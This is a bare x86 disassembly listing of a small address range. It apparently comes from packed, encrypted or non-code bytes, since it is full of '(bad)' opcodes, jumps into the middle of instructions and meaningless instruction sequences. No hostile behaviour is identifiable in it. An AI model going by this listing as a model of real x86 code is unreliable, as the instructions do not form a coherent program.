  433fae:	adc    al,0x37
  433fb0:	aad    0x58
  433fb2:	dec    DWORD PTR [ecx-0xffffbf]
  433fb8:	cmp    edi,0xffffffce
  433fbb:	add    BYTE PTR [edx+0x6bb996fb],ah
  433fc1:	enter  0x89cc,0x85
  433fc5:	mov    edi,edi
  433fc7:	(bad)  
  433fc8:	dec    esp
  433fca:	popa   
  433fcb:	push   DWORD PTR [edx+0x3e]
  433fce:	sahf   
  433fcf:	test   BYTE PTR [edx],dh
  433fd1:	mov    dl,0x83
  433fd3:	add    BYTE PTR [ebx-0xff0100],al
  433fd9:	call   DWORD PTR [ebx]
  433fdb:	jmp    DWORD PTR [edx]
  433fdd:	in     eax,0x50
  433fdf:	sub    al,0xb8
  433fe1:	xlat   BYTE PTR ds:[ebx]
  433fe2:	(bad)  
  433fe3:	call   FWORD PTR [edi-0x1]
  433fe6:	inc    DWORD PTR [eax]
  433fe8:	(bad)  
  433fe9:	inc    DWORD PTR [eax]
  433feb:	jmp    FWORD PTR [eax+0x6296d8a]
  433ff1:	mov    eax,0x8313ccff
  433ff6:	inc    DWORD PTR [ebx+0x670000]
  433ffc:	retf   0x412f
  433fff:	pusha  
  434000:	mov    ebx,DWORD PTR [edx+0x90ffff]
  434006:	inc    DWORD PTR [eax]
  434008:	add    bh,bh
  43400a:	jle    0x43400c
  43400c:	push   0x5bc3f685
  434011:	mov    cl,0x83
  434013:	mov    ecx,eax
  434015:	(bad)  
  434016:	(bad)  
  434017:	(bad)  
  434018:	inc    DWORD PTR [eax]
  43401a:	sbb    eax,0xff9939ff
  43401f:	xchg   edx,eax
  434020:	cmp    eax,0x25838923
  434025:	add    bh,bh
  434027:	cmp    edi,0xffffffff
  43402a:	xchg   bh,bh
  43402c:	xchg   DWORD PTR [esi+0x7f75d6eb],ebx
  434032:	add    bh,bh
  434034:	pop    esp
  434035:	add    bh,bh
  434037:	add    BYTE PTR [eax],al
  434039:	(bad)  
  43403a:	fadd   DWORD PTR [eax]
  43403c:	mov    ds:0xbb511401,al
  434041:	sbb    DWORD PTR [eax],eax
  434043:	mov    DWORD PTR [edi-0x1],ecx
  434046:	inc    DWORD PTR [ebx-0xd87700]
  43404c:	push   0xffffff88
  43404e:	cdq    
  43404f:	mov    ch,0xdc
  434051:	sbb    DWORD PTR [eax],eax
  434053:	(bad)  
  434054:	out    dx,eax
  434055:	mov    edi,edi
  434057:	add    bh,bh
  434059:	call   FWORD PTR [eax]
  43405b:	mov    edi,eax
  43405d:	push   ecx
  43405e:	mov    ah,0x6e
  434060:	outs   dx,BYTE PTR ds:[esi]
  434061:	push   edi
  434062:	mov    edi,edi
  434064:	push   ss
  434065:	mov    DWORD PTR [ebx-0x5b76ff7d],eax
  43406b:	inc    DWORD PTR [edx]
  43406d:	aad    0x66
  43406f:	sub    cl,BYTE PTR [eax]
  434071:	ret    0x83
  434074:	pop    edi
  434075:	add    bh,bh
  434077:	(bad)  
  434078:	inc    DWORD PTR [eax]
  43407a:	and    al,0x0
  43407c:	and    al,0xf1
  43407e:	ret    
  43407f:	mov    esp,0x83cca1ea
  434084:	xor    BYTE PTR [eax],al
  434086:	inc    DWORD PTR [eax]
  434088:	(bad)  
  434089:	call   DWORD PTR [edi+0x53c44383]
  43408f:	cdq    
  434090:	fmul   QWORD PTR gs:[ecx-0x7cff8e01]
  434097:	inc    DWORD PTR [eax]
  434099:	dec    DWORD PTR [edi+edi*8]
  43409c:	pop    ecx
  43409d:	adc    al,0x9
  43409f:	mov    edx,0x83c868
  4340a4:	jae    0xffc73faa
  4340aa:	add    BYTE PTR fs:[eax+0x7aa70fbf],ch
  4340b1:	rol    BYTE PTR [ebx-0x33ffb07d],0xff
  4340b8:	inc    DWORD PTR [eax]
  4340ba:	cmp    bh,0xa2
  4340bd:	aaa    
  4340be:	cmp    DWORD PTR [edi+eax*1+0x1d],0xffffffcc
  4340c3:	add    dl,ah
  4340c5:	add    BYTE PTR [eax],al
  4340c7:	inc    DWORD PTR [ebx+0x5789de00]
  4340cd:	fadd   st,st(7)
  4340cf:	aas    
  4340d0:	mov    cl,0x84
  4340d2:	mov    edi,edi
  4340d4:	xchg   ecx,eax
  4340d5:	add    BYTE PTR [ebx+0x1b00cc00],al
  4340db:	sub    DWORD PTR [esi+0x552de288],0xffffffa6
  4340e2:	inc    DWORD PTR [eax]
  4340e4:	xchg   edi,edi
  4340e6:	(bad)  
  4340e7:	(bad)  
  4340e8:	inc    DWORD PTR [ebx+0x36eaff40]
  4340ee:	fmul   DWORD PTR [ecx+0xffb9d5]
  4340f4:	(bad)  [ecx-0x3333ff01]
  4340fa:	(bad)  
  4340fb:	jmp    DWORD PTR [ebx-0x1438201e]
  434101:	mov    esp,0xffabcc00
  434106:	dec    DWORD PTR [ecx-0xe00001]
  43410c:	test   BYTE PTR [edx+edx*4-0x339161a1],bh
  434113:	sbb    DWORD PTR ds:0xff8900,0xffffffff
  43411a:	adc    eax,DWORD PTR [eax]
  43411c:	pop    ss
  43411d:	push   es
  43411e:	fld    QWORD PTR [ecx]
  434120:	jge    0x43410e
  434122:	add    bh,bh
  434124:	iret   
  434125:	mov    DWORD PTR [ecx+0x2f89ff00],ecx
  43412b:	sub    DWORD PTR [esi-0x367f87d2],0x77
  434132:	add    bh,bh
  434134:	repz inc DWORD PTR [eax]
  434137:	int3   
  434138:	(bad)  
  434139:	dec    DWORD PTR [edi-0x321dd87d]
  43413f:	out    0x22,eax
  434141:	sub    bh,bh
  434143:	add    BYTE PTR [ebx],dl
  434145:	dec    DWORD PTR [ecx-0x3e007700]
  43414b:	mov    ebp,edx
  43414d:	sbb    dl,BYTE PTR [edi-0x71]
  434150:	mov    al,0x7
  434152:	add    BYTE PTR [ebx-0xd5],al
  434158:	add    BYTE PTR [ecx-0x19b6ff04],cl
  43415e:	or     ch,cl
  434160:	jne    0x434160
  434162:	or     esp,0x11
  434165:	int3   
  434166:	add    bh,bh
  434168:	(bad)  
  434169:	jmp    FWORD PTR [eax-0x1]
  43416c:	frstor [edi]
  43416e:	sub    ah,ch
  434170:	imul   ebx,esi,0xff67ffff
  434176:	add    BYTE PTR [eax],al
  434178:	inc    DWORD PTR [ebx-0x3946ffe7]
  43417e:	push   edi
  43417f:	mov    esp,0x83eb41
  434184:	popf   
  434185:	(bad)  
  434186:	inc    DWORD PTR [eax]
  434188:	add    bh,bh
  43418a:	fadd   QWORD PTR [eax]
  43418c:	mov    fs,WORD PTR [edx]
  43418e:	dec    esi
  43418f:	pop    esi
  434190:	in     eax,0x29
  434192:	inc    DWORD PTR [eax]
  434194:	xchg   ebp,eax
  434195:	(bad)  
  434196:	dec    esp
  434198:	add    BYTE PTR [eax],al
  43419a:	call   0x6d2ad09f
  43419f:	jl     0x434216
  4341a1:	and    bh,bh
  4341a3:	jmp    FWORD PTR [ebx+0x0]
  4341a6:	mov    DWORD PTR [eax],eax
  4341a8:	inc    DWORD PTR [ebx-0x93effa3]
  4341ae:	add    eax,0xffe489de
  4341b3:	sub    DWORD PTR [ecx-0x1],0xffffffff
  4341b7:	add    DWORD PTR [ebx+0x7eff4289],0x7
  4341be:	push   0xbd6dc6
  4341c3:	add    dh,bh
  4341c5:	inc    DWORD PTR [ebx+0x7289ffff]
  4341cb:	add    DWORD PTR [eax+ebx*2],0xffffffd2
  4341cf:	shl    DWORD PTR [edi+0x52],cl
  4341d2:	add    BYTE PTR [eax],al
  4341d4:	fadd   QWORD PTR [ebx-0x7c010000]
  4341da:	call   DWORD PTR es:[edx-0x3a0c7d97]
  4341e1:	sti    
  4341e2:	add    BYTE PTR [eax],al
  4341e4:	mov    esi,0xff0000cc
  4341e9:	dec    DWORD PTR [esi+0x15eec5ff]
  4341ef:	in     eax,dx
  4341f0:	out    0xe9,al
  4341f2:	inc    DWORD PTR [eax]
  4341f4:	mov    ch,0xff
  4341f6:	inc    DWORD PTR [eax]
  4341f8:	add    DWORD PTR [ebx+0x7290009f],0x22
  4341ff:	(bad)  
  434200:	xlat   BYTE PTR ds:[ebx]
  434201:	xor    al,0x0
  434203:	add    BYTE PTR [edx],dl
  434205:	mov    DWORD PTR [eax],eax
  434207:	inc    DWORD PTR [eax]
  434209:	dec    DWORD PTR [ecx]
  43420b:	add    BYTE PTR [ebx+0x50],cl
  43420e:	jmp    0x4341bf
  434210:	inc    edx
  434211:	pop    ecx
  434212:	add    bh,bh
  434214:	sbb    BYTE PTR [eax],al
  434216:	cmp    edi,0xffffff89
  434219:	add    ch,bl
  43421b:	add    dh,ch
  43421d:	lods   al,BYTE PTR ds:[esi]
  43421e:	mov    bh,0x32
  434220:	mov    ah,0x72
  434222:	int3   
  434223:	push   DWORD PTR [edi+edi*8-0xff7c7d]
  43422a:	test   edi,edi
  43422c:	jge    0x434235
  43422e:	mov    dh,0x11
  434230:	neg    DWORD PTR [edx-0x7c91ff77]
  434236:	add    ah,cl
  434238:	dec    DWORD PTR [ecx+0x647eff2d]
  43423e:	mov    ebp,0xffbae618
  434243:	add    BYTE PTR [ebx-0xff0001],al
  434249:	jmp    DWORD PTR [ecx]
  43424b:	dec    DWORD PTR [ebp+0x4c]
  43424e:	add    DWORD PTR [ebp+edi*8+0x16],eax
  434252:	add    BYTE PTR [ecx-0x766a],cl
  434258:	add    BYTE PTR [ebx+0x621e00cd],al
  43425e:	je     0x434265
  434260:	stc    
  434261:	sar    bh,0xff
  434264:	fwait
  434265:	inc    DWORD PTR [eax]
  434267:	add    BYTE PTR [eax],al
  434269:	cmp    ecx,0x0
  43426c:	inc    ebp
  43426d:	mov    DWORD PTR [ebx],ebx
  43426f:	in     al,dx
  434270:	test   BYTE PTR [edx],bl
  434272:	dec    DWORD PTR [ecx-0x3300b2]
  434278:	inc    DWORD PTR [eax]
  43427a:	add    BYTE PTR ds:[esi-0x57bb7374],dh
  434281:	jl     0x434282
  434283:	cmp    DWORD PTR [ecx],0xffffffff
  434286:	cmp    edi,0xffffffff
  434289:	call   edx
  43428b:	int3   
  43428c:	xchg   cl,ah
  43428e:	aam    0xd6
  434290:	push   ecx
  434291:	in     eax,0x0
  434293:	mov    esp,edi
  434295:	int3   
  434296:	add    bh,bh
  434298:	inc    DWORD PTR [eax]
  43429a:	sti    
  43429b:	add    BYTE PTR [edi],bl
  43429d:	push   ebp
  43429e:	lahf   
  43429f:	push   ebx
  4342a0:	push   esi
  4342a1:	or     al,0xff
  4342a3:	xor    DWORD PTR [edx+0xff0000],0xffffffff
  4342aa:	jns    0x4342ab
  4342ac:	fdiv   DWORD PTR [ecx-0x2e]
  4342af:	imul   esi,DWORD PTR [ebp+eax*2-0x127601],0x0
  4342b7:	mov    DWORD PTR [eax],eax
  4342b9:	(bad)  
  4342ba:	in     al,dx
  4342bb:	dec    DWORD PTR [esi+ebp*1+0x128c1405]
  4342c2:	dec    esp
  4342c4:	cdq    
  4342c5:	inc    DWORD PTR [ebx+0x5383ffff]
  4342cb:	(bad)  
  4342cc:	aas    
  4342cd:	pop    esi
  4342ce:	out    dx,eax
  4342cf:	jge    0x434270
  4342d1:	mov    dh,0xcc
  4342d3:	int3   
  4342d4:	mov    bl,0x0
  4342d6:	int3   
  4342d7:	inc    DWORD PTR [eax]
  4342d9:	int3   
  4342da:	add    BYTE PTR [eax],0xe2
  4342dd:	or     ebx,edi
  4342df:	xor    al,0x9a
  4342e1:	mov    ds:0xff7a00ff,eax
  4342e6:	add    BYTE PTR [ebx+0x48ccff],al
  4342ec:	xor    eax,0x7b02cc6a
  4342f1:	jae    0x4342f3
  4342f3:	add    BYTE PTR [esi-0x1],bh
  4342f6:	add    DWORD PTR [eax],0xffffffff
  4342f9:	call   FWORD PTR [ebx+0x0]
  4342fc:	push   cx
  4342fe:	cmp    al,0xf5
  434300:	retf   0xffe5
  434303:	inc    DWORD PTR [ebp-0x33000100]
  434309:	call   DWORD PTR [ebp-0x1]
  43430c:	div    eax
  43430e:	mov    WORD PTR [esi-0x7600bc64],?
  434314:	xlat   BYTE PTR ds:[ebx]
  434315:	add    BYTE PTR [ebx+0x5bff83ff],al
  43431b:	jmp    FWORD PTR [ecx+0x7ac5af5b]
  434321:	pop    esp
  434322:	inc    DWORD PTR [eax]
  434324:	dec    edx
  434325:	add    bh,bh
  434327:	(bad)  
  434328:	inc    DWORD PTR [eax]
  43432a:	sar    edi,0xba
  43432d:	xchg   DWORD PTR [edx+0x6a],edx
  434330:	lods   al,BYTE PTR ds:[esi]
  434331:	cwde   
  434332:	mov    esp,ecx
  434334:	push   ebp
  434335:	(bad)  
  434336:	dec    DWORD PTR [ecx-0x4a0001]
  43433c:	mov    bl,0xdf
  43433e:	fwait
  43433f:	ja     0x434300
  434341:	add    bh,bh
  434343:	add    dl,bh
  434345:	inc    DWORD PTR [eax]
  434347:	int3   
  434348:	add    BYTE PTR [eax],al
  43434a:	mov    cl,0x0
  43434c:	mov    eax,ds:0xdd2ff1f8
  434351:	loop   0x434352
  434353:	and    DWORD PTR [edi+0x898300],0xffffffff
  43435a:	pusha  
  43435b:	add    BYTE PTR [ebp-0x759b428c],bh
  434361:	icebp  
  434362:	(bad)  
  434363:	dec    DWORD PTR [eax-0x100]
  434369:	xor    DWORD PTR [esi],0xffffffcc
  43436c:	fiadd  DWORD PTR [ecx-0x737852ce]
  434372:	(bad)  
  434373:	call   FWORD PTR [edi-0x76000001]
  434379:	(bad)  
  43437a:	(bad)  
  43437c:	pop    eax
  43437d:	xlat   BYTE PTR ds:[ebx]
  43437e:	(bad)  
  43437f:	mov    esp,0xffffd5c8
  434384:	jnp    0x434385
  434386:	dec    esp
  434388:	int3   
  434389:	jmp    DWORD PTR [ebp+0x286f7eff]
  43438f:	push   esp
  434390:	fcmove st,st(5)
  434392:	add    bh,bh
  434394:	dec    esi
  434395:	add    BYTE PTR [eax],al
  434397:	add    BYTE PTR [eax],al
  434399:	and    DWORD PTR [ecx+0x0],0xffffff86
  43439d:	shr    BYTE PTR [edx],0x97
  4343a0:	scas   eax,DWORD PTR es:[edi]
  4343a1:	aad    0x89
  4343a3:	adc    DWORD PTR [ebx-0xff01],0xffffffcc
  4343aa:	mov    ch,0x0
  4343ac:	sbb    al,cl
  4343ae:	sbb    bh,BYTE PTR [edx+0x83a92c]
  4343b4:	and    eax,0xff0083ff
  4343b9:	mov    ebx,edx
  4343bb:	jmp    FWORD PTR ds:0xf588c202
  4343c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4343c2:	(bad)  
  4343c3:	(bad)  
  4343c4:	cmp    ah,cl
  4343c6:	inc    DWORD PTR [eax]
  4343c8:	int3   
  4343c9:	int3   
  4343ca:	adc    al,BYTE PTR [eax]
  4343cc:	shl    BYTE PTR [eax],cl
  4343ce:	js     0x4343d5
  4343d0:	and    bh,dh
  4343d2:	inc    DWORD PTR [eax]
  4343d4:	or     al,BYTE PTR [eax]
  4343d6:	dec    DWORD PTR [ecx-0x76510001]
  4343dc:	fmulp  st(6),st
  4343de:	push   0x36
  4343e0:	loop   0x4343b1
  4343e2:	inc    DWORD PTR [ebx-0xff45]
  4343e8:	inc    DWORD PTR [ebx-0x44e70058]
  4343ee:	mov    edx,0xff6688e8
  4343f3:	xor    ecx,0xffffff83
  4343f6:	(bad)  
  4343f7:	(bad)  
  4343f8:	inc    DWORD PTR [eax]
  4343fa:	mov    BYTE PTR [ebx+0x524d8eb5],0x59
  434401:	out    dx,al
  434402:	dec    DWORD PTR [ecx-0x76336f]
  434408:	inc    DWORD PTR [eax]
  43440a:	add    al,0x0
  43440c:	mov    ah,0x8
  43440e:	jecxz  0x434461
  434410:	rol    BYTE PTR [esi],0xcc
  434413:	mov    DWORD PTR [ebx],edx
  434415:	(bad)  
  434416:	inc    DWORD PTR [eax]
  434418:	mov    esp,ecx
  43441a:	mov    ebp,0xb37a82cc
  43441f:	pushf  
  434420:	js     0x434473
  434422:	add    BYTE PTR [eax],al
  434424:	or     ah,0x89
  434427:	inc    DWORD PTR [eax]
  434429:	jmp    DWORD PTR [eax]
  43442b:	jmp    FWORD PTR [ebx]
  43442d:	in     eax,dx
  43442e:	fst    DWORD PTR [ebx-0x33332614]
  434434:	adc    al,0x0
  434436:	inc    DWORD PTR [eax]
  434438:	inc    DWORD PTR [eax]
  43443a:	(bad)  
  43443b:	inc    ecx
  43443d:	mov    ch,0x6f
  43443f:	mov    ds:0xffcc15a3,al
  434444:	retf   0xffff
  434447:	inc    DWORD PTR [ebx+0x22002983]
  43444d:	pop    es
  43444e:	fbld   TBYTE PTR [edi-0x2bbf]
  434454:	add    BYTE PTR gs:[eax],al
  434457:	dec    esp
  434459:	add    BYTE PTR [ecx],dh
  43445b:	jmp    FWORD PTR [eax]
  43445d:	push   ds
  43445e:	adc    eax,0xfaa572
  434463:	add    BYTE PTR [eax-0xff3377],bl
  434469:	inc    DWORD PTR [edx]
  43446b:	int3   
  43446c:	fld    QWORD PTR [edi+0x72]
  43446f:	inc    edi
  434470:	mov    ds:0xaeffffa5,al
  434475:	inc    DWORD PTR [eax]
  434477:	add    bh,bh
  434479:	adc    DWORD PTR [edi-0x16191401],0x44
  434480:	aaa    
  434481:	je     0x434482
  434483:	add    BYTE PTR [ebx-0x1],bl
  434486:	dec    esp
  434488:	(bad)  
  434489:	call   FWORD PTR [ecx]
  43448b:	jmp    FWORD PTR [edi]
  43448d:	out    dx,eax
  43448e:	test   DWORD PTR [edx],0xff00bab4
  434494:	fiadd  WORD PTR [ebx-0xffff01]
  43449a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43449b:	mov    DWORD PTR [ebx+0x6f582559],eax
  4344a1:	mov    DWORD PTR [eax],0xffff6eff
  4344a7:	(bad)  
  4344a8:	(bad)  
  4344a9:	push   DWORD PTR [edi]
  4344ab:	call   DWORD PTR [edi-0x44]
  4344ae:	jno    0x434440
  4344b0:	popf   
  4344b1:	retf   0xffff
  4344b4:	mov    bl,0xff
  4344b6:	(bad)  
  4344b7:	(bad)  
  4344b8:	dec    DWORD PTR [ecx-0x657e7c30]
  4344be:	or     DWORD PTR [esp+ebx*8],ebp
  4344c1:	adc    eax,DWORD PTR [eax]
  4344c3:	add    dh,bl
  4344c5:	inc    DWORD PTR [eax]
  4344c7:	add    bh,bh
  4344c9:	add    BYTE PTR [edx+0x36268800],dh
  4344cf:	addr16 pusha 
  4344d1:	or     eax,DWORD PTR [ebx-0x7c33227d]
  4344d7:	add    bh,bh
  4344d9:	int3   
  4344da:	in     eax,0x89
  4344dc:	mov    cl,0x49
  4344de:	cmp    dh,ah
  4344e0:	(bad)  
  4344e1:	ror    ah,cl
  4344e3:	add    ah,dl
  4344e5:	inc    DWORD PTR [eax]
  4344e7:	add    bh,bh
  4344e9:	dec    eax
  4344eb:	or     DWORD PTR [edx-0x529d7a71],0x5d
  4344f2:	(bad)  
  4344f3:	jmp    DWORD PTR [eax]
  4344f5:	add    BYTE PTR [eax],al
  4344f7:	int3   
  4344f8:	int3   
  4344f9:	and    eax,0x0
  4344fc:	repnz dec esp
  4344fe:	push   ss
  4344ff:	or     ah,al
  434501:	add    BYTE PTR [eax],al
  434503:	mov    DWORD PTR [esi],eax
  434505:	inc    DWORD PTR [ebx+0x79ffffcc]
  43450b:	int3   
  43450c:	sbb    BYTE PTR [ebp-0x2c681189],bl
  434512:	inc    DWORD PTR [eax]
  434514:	enter  0xff,0xff
  434518:	cmp    edi,0x34
  43451b:	inc    DWORD PTR [ecx-0x79ea1813]
  434521:	sbb    eax,0xcccf8900
  434526:	add    bh,bh
  434528:	inc    DWORD PTR [eax]
  43452a:	mov    BYTE PTR [eax],0xaa
  43452d:	in     eax,dx
  43452e:	int    0x14
  434530:	ror    ebx,0x0
  434533:	add    BYTE PTR [edx],al
  434535:	add    BYTE PTR [ebx+0x49ff00cc],al
  43453b:	int3   
  43453c:	jo     0x4345a6
  43453e:	(bad)  
  43453f:	inc    ebx
  434540:	adc    esp,DWORD PTR [esp+ecx*8]
  434543:	(bad)  
  434544:	jmp    0x434545
  434546:	cmp    edi,0x0
  434549:	add    BYTE PTR [edi+edi*8-0x1c],ch
  43454d:	gs das 
  43454f:	push   edi
  434550:	stos   BYTE PTR es:[edi],al
  434551:	arpl   di,di
  434553:	call   FWORD PTR [eax]
  434555:	mov    edi,edi
  434557:	dec    DWORD PTR [ecx-0x2b337f01]
  43455d:	sub    eax,0xb61738b5
  434562:	inc    DWORD PTR [eax]
  434564:	push   ecx
  434565:	inc    DWORD PTR [eax]
  434567:	int3   
  434568:	add    bh,bh
  43456a:	(bad)  
  43456b:	dec    esi
  43456d:	aas    
  43456e:	div    BYTE PTR [ecx-0xffe16a]
  434574:	push   edx
  434575:	mov    esp,ecx
  434577:	(bad)  
  434578:	dec    esp
  43457a:	ja     0x4344ff
  43457c:	lock stc 
  43457e:	enter  0x2351,0x51
  434582:	add    BYTE PTR [eax],al
  434584:	jb     0x434509
  434586:	inc    DWORD PTR [eax]
  434588:	int3   
  434589:	(bad)  
  43458a:	mov    ecx,0x4ca25bff
  43458f:	cs pop es
  434591:	pop    ebx
  434592:	add    DWORD PTR [eax],0xffffffca
  434595:	add    BYTE PTR [eax],al
  434597:	add    BYTE PTR [ecx-0x67ff9d00],cl
  43459d:	push   0x2d
  43459f:	test   DWORD PTR [ebx],ebp
  4345a1:	adc    DWORD PTR [eax],eax
  4345a3:	call   FWORD PTR [ecx-0x1]
  4345a6:	add    bh,bh
  4345a8:	add    BYTE PTR [eax],al
  4345aa:	dec    edi
  4345ab:	mov    DWORD PTR [ebp+0x55],esi
  4345ae:	ja     0x434530
  4345b0:	mov    ecx,DWORD PTR [ecx]
  4345b2:	add    BYTE PTR [eax],al
  4345b4:	sbb    eax,0xcc8300
  4345b9:	sub    DWORD PTR [edi+0x0],0xffffff9c
  4345bd:	es ins BYTE PTR es:[edi],dx
  4345bf:	leave  
  4345c0:	stos   BYTE PTR es:[edi],al
  4345c1:	inc    ebx
  4345c2:	inc    DWORD PTR [eax]
  4345c4:	mov    ah,0xff
  4345c6:	inc    DWORD PTR [ebx-0x7cb20034]
  4345cc:	sub    eax,0x662e26da
  4345d1:	rol    DWORD PTR [eax],1
  4345d3:	jmp    FWORD PTR [ecx-0x7d]
  4345d6:	(bad)  
  4345d7:	inc    DWORD PTR [eax]
  4345d9:	and    DWORD PTR [edi-0x77],0x21
  4345dd:	or     al,0x7a
  4345df:	test   eax,0x7cff8311
  4345e5:	mov    edi,edi
  4345e7:	add    bh,bh
  4345e9:	inc    DWORD PTR [ebx]
  4345eb:	add    BYTE PTR [ebx+0x0],dh
  4345ee:	outs   dx,DWORD PTR ds:[esi]
  4345ef:	push   ss
  4345f0:	mov    DWORD PTR [ebp+0x0],eax
  4345f3:	add    BYTE PTR [edi],ch
  4345f5:	(bad)  
  4345f6:	inc    DWORD PTR [eax]
  4345f8:	inc    DWORD PTR [eax]
  4345fa:	sar    bh,cl
  4345fc:	nop
  4345fd:	aas    
  4345fe:	inc    edx
  4345ff:	push   ds
  434600:	cmp    al,0xfa
  434602:	int3   
  434603:	sbb    edx,0xffffffff
  434606:	dec    esp
  434608:	(bad)  
  434609:	inc    DWORD PTR [ebx+0x0]
  43460c:	and    cl,BYTE PTR [ebx-0x39]
  43460f:	mov    ds:0xff00f072,al
  434614:	pop    eax
  434615:	(bad)  
  434616:	dec    esp
  434618:	int3   
  434619:	jmp    DWORD PTR [esi-0x34]
  43461c:	sbb    DWORD PTR [esi],esi
  43461e:	sti    
  43461f:	test   al,0xe7
  434621:	in     al,dx
  434622:	cmp    edi,0xfffffff7
  434625:	(bad)  
  434626:	inc    DWORD PTR [eax]
  434628:	(bad)  
  434629:	jmp    FWORD PTR [ecx-0x5cdd800]
  43462f:	lea    esi,[ecx-0x5b]
  434632:	add    BYTE PTR [eax],al
  434634:	mov    dl,0x89
  434636:	inc    DWORD PTR [eax]
  434638:	add    bh,bh
  43463a:	or     edi,edi
  43463c:	pop    edi
  43463d:	not    BYTE PTR [eax+eax*8+0xff4c1c]
  434644:	mov    esp,0xffff83ff
  434649:	dec    DWORD PTR [ebx]
  43464b:	add    dl,bh
  43464d:	xchg   esi,eax
  43464e:	(bad)  
  43464f:	out    0x35,eax
  434651:	jge    0x434652
  434653:	add    BYTE PTR [ecx-0x7c7d],bl
  434659:	jmp    DWORD PTR [ecx-0x1]
  43465c:	fisub  DWORD PTR [esi+0xb]
  43465f:	in     al,dx
  434660:	(bad)  
  434662:	inc    DWORD PTR [eax]
  434664:	aaa    
  434665:	dec    DWORD PTR [ecx+0x6c0000cc]
  43466b:	int3   
  43466c:	mov    ch,0xc5
  43466e:	jl     0x434649
  434670:	add    al,0x7c
  434672:	(bad)  
  434673:	push   DWORD PTR [ebp-0x34]
  434679:	add    al,dl
  43467b:	inc    DWORD PTR [ebx+0x2d]
  43467e:	cld    
  43467f:	mov    dh,0x2a
  434681:	push   ebp
  434682:	(bad)  
  434683:	jmp    DWORD PTR [esi+0x0]
  434686:	mov    edi,edi
  434688:	add    bh,bh
  43468a:	jmp    0x3962ee12
  43468f:	sti    
  434690:	adc    al,0xbc
  434692:	(bad)  
  434693:	inc    DWORD PTR [edi-0x7c000001]
  434699:	(bad)  
  43469a:	fld    QWORD PTR [ebx+0x4522971c]
  4346a0:	enter  0xcb,0xff
  4346a4:	sub    al,BYTE PTR [eax]
  4346a6:	mov    edi,edi
  4346a8:	dec    DWORD PTR [ecx+0xc830025]
  4346ae:	jmp    0x4346fd
  4346b0:	out    0x51,al
  4346b2:	add    bh,bh
  4346b4:	mov    esp,0xffccffff
  4346b9:	(bad)  
  4346ba:	mov    esi,0x9d6b7383
  4346bf:	daa    
  4346c0:	in     eax,0x3d
  4346c2:	add    ah,cl
  4346c4:	pop    ebp
  4346c5:	(bad)  
  4346c6:	(bad)  
  4346c7:	(bad)  
  4346c8:	inc    DWORD PTR [eax]
  4346ca:	pop    eax
  4346cb:	add    BYTE PTR [eax+0x524a9a9e],dl
  4346d1:	out    0x0,al
  4346d3:	add    BYTE PTR [edx-0x7c7c0077],bl
  4346d9:	xor    DWORD PTR [esi],0xffffffcc
  4346dc:	mov    bh,0x73
  4346de:	(bad)  
  4346df:	loop   0x4346b1
  4346e1:	add    eax,0x2ffff
  4346e6:	inc    DWORD PTR [eax]
  4346e8:	inc    DWORD PTR [eax]
  4346ea:	sub    eax,0x4dd9c600
  4346ef:	adc    esp,DWORD PTR [edi-0x2dff7649]
  4346f5:	add    BYTE PTR [ebx-0x2cffff34],al
  4346fb:	sub    DWORD PTR [edx+eiz*1-0x3bd62e44],0x0
  434703:	sub    eax,0xffffffff
  434706:	add    bh,bh
  434708:	cmp    edi,0x2
  43470b:	add    BYTE PTR [ecx+eax*1-0x1],ah
  43470f:	mov    eax,ds:0xccfe46
  434714:	xchg   edi,eax
  434715:	dec    DWORD PTR [ecx-0x51330001]
  43471b:	jmp    FWORD PTR [ecx]
  43471d:	mov    dh,0x1c
  43471f:	repnz pop cx
  434722:	add    BYTE PTR [eax],al
  434724:	idiv   edi
  434726:	add    BYTE PTR [eax],al
  434728:	add    DWORD PTR [eax],0x55
  43472b:	and    DWORD PTR [ecx+0x5ffb1083],0xffffffdf
  434732:	(bad)  
  434733:	call   FWORD PTR [ebp-0x1]
  434736:	inc    DWORD PTR [ebx-0x7cce0001]
  43473c:	sahf   
  43473d:	imul   esp,DWORD PTR [eax],0x39
  434740:	int    0xe6
  434742:	inc    DWORD PTR [eax]
  434744:	sahf   
  434745:	cmp    edi,0xffffffcc
  434748:	add    BYTE PTR [ebx+0x399289eb],al
  43474e:	mov    ecx,0xff10066d
  434753:	add    al,al
  434755:	add    bh,bh
  434757:	or     esp,0xffffff89
  43475a:	xchg   ecx,eax
  43475b:	(bad)  
  43475c:	mov    esp,0x79b631ee
  434761:	push   esi
  434762:	add    BYTE PTR [ecx-0x76ff00f8],cl
  434768:	(bad)  
  434769:	jmp    DWORD PTR [eax]
  43476b:	inc    DWORD PTR [eax+0x60]
  43476e:	jo     0x43478a
  434770:	or     esi,edx
  434772:	add    DWORD PTR [eax],0x5a
  434775:	int3   
  434776:	add    BYTE PTR [ebx+0x20000],al
  43477c:	cmp    al,0xd8
  43477e:	pop    edi
  43477f:	pop    edi
  434780:	call   0xa6cc4875
  434785:	int3   
  434786:	(bad)  
  434787:	(bad)  
  434788:	(bad)  
  434789:	push   DWORD PTR ds:0x395bccff
  43478f:	pop    edx
  434790:	and    al,0xe3
  434792:	inc    DWORD PTR [ebx+0xff8966]
  434798:	dec    esp
  43479a:	inc    DWORD PTR [ebx+0x13519a3f]
  4347a0:	js     0x434817
  4347a2:	add    bh,bh
  4347a4:	jno    0x4347a5
  4347a6:	(bad)  
  4347a7:	(bad)  
  4347a8:	inc    DWORD PTR [eax]
  4347aa:	mov    edi,edi
  4347ac:	icebp  
  4347ad:	push   cs
  4347ae:	pop    ebx
  4347af:	xchg   ebp,eax
  4347b0:	(bad)  
  4347b1:	and    al,0xff
  4347b3:	and    DWORD PTR [edi],0x0
  4347b6:	(bad)  
  4347b7:	dec    DWORD PTR [ecx-0x3fffe000]
  4347bd:	or     eax,0xb90781bd
  4347c2:	(bad)  
  4347c3:	(bad)  
  4347c4:	clc    
  4347c5:	inc    DWORD PTR [ebx-0x41010000]
  4347cb:	xor    DWORD PTR ds:0x2a348ee2,0xfffffff8
  4347d2:	add    BYTE PTR [eax],al
  4347d4:	inc    ebx
  4347d5:	(bad)  
  4347d6:	inc    DWORD PTR [eax]
  4347d8:	add    ah,cl
  4347da:	stos   BYTE PTR es:[edi],al
  4347db:	sbb    edi,0xffffffc5
  4347de:	and    dh,dh
  4347e0:	cmp    DWORD PTR [ebx+eax*4],ebp
  4347e3:	mov    edx,eax
  4347e5:	dec    esp
  4347e7:	add    BYTE PTR [eax],al
  4347e9:	int3   
